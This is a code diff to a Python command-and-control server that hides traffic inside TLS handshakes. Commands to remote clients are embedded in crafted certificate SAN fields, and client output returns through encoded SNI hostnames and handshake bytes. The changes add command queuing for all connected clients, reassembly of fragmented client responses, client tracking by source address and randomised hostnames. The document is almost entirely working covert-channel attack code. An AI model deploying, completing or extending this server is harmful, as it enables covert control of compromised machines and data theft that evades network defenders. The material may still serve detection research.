@@ -43,11 +43,11 @@ import random
 import string
 import threading
 import socket
+import sys
 import argparse
 import queue
 import time
 import math
-import curses
 
 import http.server
 
@@ -55,27 +55,46 @@ import http.server
 # Globals
 #
 
-MAX_SINGLE_MSG_LEN = 255
-MAX_TOTAL_MSG_LEN = MAX_SINGLE_MSG_LEN * 62
+MAX_SINGLE_MSG_LEN = 255  # max len of a single SAN entry
+MAX_TOTAL_MSG_LEN = MAX_SINGLE_MSG_LEN * 62  # You can have up to 16k bytes total in a SAN record ~(roughly)
+# These for a random HOST/TLD generators
+MAX_TLD_LEN = 4
+MAX_HOST_LEN = 8
+MAX_DOMAIN_LEN = 6
+MAX_CLIENT_AGE = 60  # Mark a client disconnected if it does not check in for this number of seconds
+VERBOSE = True  # Show some additional output
+MAX_CONSOLE_MSG_LEN = 500  # only print this number of chars
 
 # This Mixin is not that exciting since... ALL we are doing is handshaking TLS
 class TLSSocketServerMixIn:
     def finish_request(self, sock, *args):
-        tlslite_connector = TLSConnection(sock, C2Server.callback)
-        if self.handshake(tlslite_connector) == True:
-            tlslite_connector.close()
+        try:
+            tlslite_connector = TLSConnection(sock, C2Server.callback)
+            if self.handshake(tlslite_connector) == True:
+                tlslite_connector.close()
+        except Exception as e:
+            # We wrap this in a try block because drive-by scanners, crawlers will trip this all day
+            # print(str(e.args))
+            print("[!] Exception occured while handling of TLS Connection in TLSSocketServerMixIn()")
+            raise e
 
 
 class Client:
     def __init__(
-        self, connected_ts=int(datetime.now().timestamp()), last_poll_ts=0, unique_id="0", src_ip="0.0.0.0"
+        self, connected_ts=int(datetime.now().timestamp()), last_poll_ts=0, unique_id="0", src="0.0.0.0:0"
     ) -> None:
         self.connected_ts = connected_ts
         self.last_poll_ts = last_poll_ts
+        self.is_connected = False
+        self.pending_cmd = []
+        self.fragments = []
         self.unique_id = unique_id
-        self.src_ip = src_ip
+        self.src = src
         # TODO: Implement more cool data elements, like OS type/version, and other sweet telemetry gathered...
         # This should be a pretty substantial list of things....
+
+    def __str__(self):
+        return str(vars(self))
 
 
 #
@@ -102,21 +121,40 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
             value = ""
         return value
 
-    def callback(self, sni_object: SNIExtension, client_random: bytes) -> typing.Tuple[X509CertChain, bytes]:
+    def callback(
+        self, sni_object: SNIExtension, protocol_headers: bytes, sock: socket.socket
+    ) -> typing.Tuple[X509CertChain, bytes]:
         """The tlslite.tlsconnection module calls this function before responding with a ServerHello"""
         # What kind of request is this?
         client_msg = Message()
         # Check if this is a returning client
         is_existing_client = False
-        client_id = client_msg.get_client_id(client_random)
+        client_msg.set(protocol_headers)
+        client_id = client_msg.get_client_id(protocol_headers)
         if client_id in self.CLIENT_DICT.keys():
             is_existing_client = True
         # Get the message type
         reply_msg = Message()
         # Get our SNI payload (which we may or may not need, depending on msg type
-        sni_raw_bytes = sni_object.hostNames[0]
-        sni_decoded_bytes = self._decode_msg(sni_raw_bytes)
-        if client_msg.get_msg_type(client_random) == ClientMessage.CONNECT:
+        sni_decoded_bytes = b""
+        try:
+            sni_decoded_bytes = self._decode_msg(sni_object.hostNames[0])
+        except:
+            sni_decoded_bytes = b"__ERROR_SERVER_FAILED_TO_DECODE_SNI!"
+        sni_text = ""
+        try:
+            sni_text = sni_decoded_bytes.decode()
+        except:
+            pass
+        cmd_msg = b""
+        # Our default SAN response is some random tld
+        client_msg_type = client_msg.get_msg_type(protocol_headers)
+        # if VERBOSE:
+        #     self._append_log_message(
+        #         f"RECV < [[ {len(sni_decoded_bytes)} bytes; client_id: {client_id.hex()}; msg_type={client_msg_type.hex()}; encoded_sni= ` {sni_text[:50]} ` ]]"
+        #     )
+        self.set_cert(".".join(self._get_random_hostname()).encode())
+        if client_msg_type == ClientMessage.CONNECT:
             # Setup a new nession
             # TODO: Make client sessions persist!
             # Which means a client will hash some machine specific attribute and write it to file, etc
@@ -124,19 +162,54 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
                 # generate a client id and insert into our list
                 client_id = bytes([random.randrange(0, 256) for _ in range(0, 2)])
                 self.CLIENT_DICT[client_id] = Client()
-                # TODO: Figure out how to get the SRC IP of our client....
+                self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
+                self.CLIENT_DICT[client_id].src = sock.getpeername()[0] + ":" + str(sock.getpeername()[1])
+                self.CLIENT_DICT[client_id].is_connected = True
                 self._append_log_message(
-                    f"New client '{client_id.hex()}' connected from {self.CLIENT_DICT[client_id].src_ip}"
+                    f"New client '{client_id.hex()}' connected from {self.CLIENT_DICT[client_id].src}"
                 )
             else:
                 # This is a returning client
                 self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
             reply_msg.header = client_id + ServerMessage.ACK
-            self.set_cert(sni_raw_bytes)
-        if client_msg.get_msg_type(client_random) == ClientMessage.POLL and is_existing_client:
+        if client_msg_type == ClientMessage.POLL and is_existing_client:
             # we got a POLL from an existing client (a heartbeat)
             self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
-            reply_msg.header = client_id + ServerMessage.ACK
+            # See if we have any pending CMD's to send to this client
+            if self.CLIENT_DICT[client_id].pending_cmd:
+                reply_msg.header = client_id + ServerMessage.CMD_AVAILABLE
+                cmd_msg = self.CLIENT_DICT[client_id].pending_cmd.pop().encode()
+                self.set_cert(cmd_msg)
+            else:
+                reply_msg.header = client_id + ServerMessage.ACK
+        if self._is_response_or_fragment(protocol_headers) and is_existing_client:
+            reply_msg_type = self._assemble_response(client_id, protocol_headers, sni_decoded_bytes)
+            reply_msg.header = client_id + reply_msg_type
+            reply_msg.body = client_msg.body
+            if client_msg_type == ClientMessage.RESPONSE:
+                # We have a fully assembed payload, do something with it
+                response_bytes = b"".join(self.CLIENT_DICT[client_id].fragments)
+                # try to interpret payload as a string
+                response_str = ""
+                try:
+                    response_str = response_bytes.decode().rstrip()
+                except:
+                    response_str = "[!] Could not decode bytes as string!"
+                ellipsis = ""
+                if len(response_str) > MAX_CONSOLE_MSG_LEN:
+                    ellipsis = "..."
+                self._append_log_message(
+                    f"client '{client_id.hex()}' sent {len(response_bytes)} bytes. Response Message: {response_str[:MAX_CONSOLE_MSG_LEN]+ellipsis}"
+                )
+                # clear our fragments buffer
+                self.CLIENT_DICT[client_id].fragments = []
+        if is_existing_client:
+            self.CLIENT_DICT[client_id].last_poll_ts = int(datetime.now().timestamp())
+            self.CLIENT_DICT[client_id].is_connected = True
+        # if VERBOSE:
+        #     self._append_log_message(
+        #         f"SEND > [[ {len(cmd_msg)} bytes; client_id: {client_id.hex()}; msg_type={reply_msg_type.hex()}; decoded_san= ` {cmd_msg.decode()[:50]} ` ]]"
+        #     )
         return (X509CertChain([self.KEYSTORE.public.tlslite]), reply_msg.to_bytes())
 
     # We include this KEYSTORE object in the callback because we're being invoked from the tlslite-ng lib
@@ -151,11 +224,48 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
     )
     session_cache = None
 
+    @staticmethod
+    def _is_response_or_fragment(protocol_headers: bytes) -> bool:
+        m = Message()
+        result = False
+        if m.get_msg_type(protocol_headers) == ClientMessage.FRAGMENT:
+            result = True
+        if m.get_msg_type(protocol_headers) == ClientMessage.RESPONSE:
+            result = True
+        return result
+
     def _append_log_message(self, message: str) -> None:
         self.MSG_LIST.append(f">>> {time.ctime()}: {message}")
 
+    def send_command(self, cmd: str) -> None:
+        # TODO: For now, all connected clients get sent the command. Need to build out to target specific clients
+        for k, v in self.CLIENT_DICT.items():
+            self.CLIENT_DICT[k].pending_cmd.append(cmd)
+
+    def _assemble_response(self, client_id: bytes, protocol_headers: bytes, fragment: bytes) -> bytes:
+        """Adds a data fragment to the clients record until all is read
+        Returns false if a retransmission is nessesary, in the case of CRC failure, etc
+        """
+        m = Message()
+        payload_len = struct.unpack(">L", (m.get_payload_len(protocol_headers)))[0]
+        seq_num = struct.unpack(">L", (m.get_sequence_num(protocol_headers)))[0]
+        crc = struct.unpack(">L", (m.get_crc(protocol_headers)))[0]
+        # enforce some size limitations (for now)
+        # if payload_len > MAX_FILE_SIZE:
+        #     return False
+        # Ensure that our sequence number is what we expect
+        if seq_num != len(self.CLIENT_DICT[client_id].fragments):
+            # TODO: need a more graceful way to handle an out of sequence packet...
+            return ServerMessage.ABORT
+        # computer our crc
+        if m.compute_crc(fragment) != crc:
+            return ServerMessage.CRC_ERROR
+        # everthing looks good
+        self.CLIENT_DICT[client_id].fragments.append(fragment)
+        return ServerMessage.ACK
+
     def set_cert(self, sni_msg_bytes: bytes) -> None:
-        """This set the current Keystore to the crafted x509 certificate we wanna send"""
+        """This sets the current Keystore to the crafted x509 certificate we wanna send"""
         self.KEYSTORE.public.x509 = self.create_message(sni_msg_bytes, encode=True)
         self.KEYSTORE.public.pem = self.KEYSTORE.public.x509.public_bytes(encoding=serialization.Encoding.PEM).decode()
         tlslite_cert = X509()
@@ -223,7 +333,7 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
             name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, sni_msg_str)])
         if len(sni_msg_str) > MAX_SINGLE_MSG_LEN:
             print(
-                f"ERROR: Encoded message length of {len(sni_msg_str)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_SINGLE_MSG_LEN}"
+                f"ERROR: Encoded message length of {len(sni_msg_str)} exceeds MAX_SINGLE_MSG_LEN of {MAX_SINGLE_MSG_LEN}"
             )
             raise NotImplementedError
         # Our smuggled payload goes into the SAN
@@ -246,6 +356,10 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
         # cert_pem = cert.public_bytes(encoding=serialization.Encoding.PEM)
         self.current_cert = cert
         return cert
+
+    @staticmethod
+    def _get_random_tld():
+        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, MAX_TLD_LEN)))
 
     @staticmethod
     def _get_random_seed() -> bytes:
@@ -272,9 +386,9 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
 
     @staticmethod
     def _get_random_hostname() -> typing.Tuple[str, str, str]:
-        tld = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))
-        domain = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 8)))
-        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 32)))
+        tld = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, MAX_TLD_LEN)))
+        domain = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(3, MAX_DOMAIN_LEN)))
+        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, MAX_HOST_LEN)))
         return host, domain, tld
 
     @staticmethod
@@ -349,11 +463,22 @@ class TLSServer(socketserver.ThreadingMixIn, TLSSocketServerMixIn, http.server.H
 # end class C2Server()
 
 
-def _watch_msg_list(c2_instance: TLSServer, screen: object) -> None:
+def _watch_msg_list(c2_instance: TLSServer, prompt: str) -> None:
     while True:
+        is_last_line = False
         if c2_instance.MSG_LIST:
-            screen.addstr(c2_instance.MSG_LIST.pop() + "\n")
-        time.sleep(0.1)
+            print()
+            print(c2_instance.MSG_LIST.pop())
+        if is_last_line:
+            sys.stdout.write(prompt)
+            sys.stdout.flush()
+            is_last_line = False
+        # Police our connected client list. Mark stale ones down
+        for k, v in c2_instance.CLIENT_DICT.items():
+            if v.is_connected:
+                if (v.last_poll_ts + MAX_CLIENT_AGE) < int(datetime.now().timestamp()):
+                    c2_instance.CLIENT_DICT[k].is_connected = False
+        time.sleep(1)
 
 
 if __name__ == "__main__":
@@ -385,38 +510,34 @@ if __name__ == "__main__":
     C2Server.allow_reuse_port = True
     server_thread = threading.Thread(target=C2Server.serve_forever, daemon=True)
     # Now for console (curses) awesomeness...
-    screen = curses.initscr()
-    screen.nodelay(False)
-    curses.echo()
-    # curses.nonl()
+    prompt = "c2server >>> "
     # We also want a thread to watch our Message Queue for printing things to console
-    console_msg_thread = threading.Thread(target=_watch_msg_list, args=[C2Server, screen], daemon=True)
+    console_msg_thread = threading.Thread(target=_watch_msg_list, args=[C2Server, prompt], daemon=True)
     #
     # TODO: our console msg thread is still fcked up. It's not updating the screen!! FIX THIS
     #
     console_msg_thread.start()
-    screen.addstr(f"[+] Listening on 0.0.0.0:{port}\n")
-    screen.addstr("Type 'help' for more information. To terminate the process, type 'exit'\n")
+    print(f"[+] Listening on 0.0.0.0:{port}")
+    print("Type 'help' for more information. To terminate the process, type 'exit'")
     try:
         server_thread.start()
         while True:
             # get input from console
-            screen.addstr(">>> ")
-            screen.refresh()
-            cmd = screen.getstr().decode()
-            # cmd = input(">>> ")
+            cmd = input(prompt)
             # handle any cmd's from the console
-            if not cmd:
-                continue
+            if cmd.startswith("cmd"):
+                C2Server.send_command(" ".join(cmd.split(" ")[1:]))
+            if cmd.startswith("list"):
+                for k, v in C2Server.CLIENT_DICT.items():
+                    print(f"{k.hex()}: {v}")
             if cmd == "help":
-                screen.addstr("NOT IMPLEMENTED YET!\n")
+                print("NOT IMPLEMENTED YET!")
             if cmd == "exit":
                 break
             # TODO: Add more commands here!
             # Ex. list clients, etc :)
         raise KeyboardInterrupt
     except KeyboardInterrupt:
-        curses.endwin()
         # console_msg_thread.join() # this will die of natural causes
         C2Server.shutdown()
         C2Server.server_close()
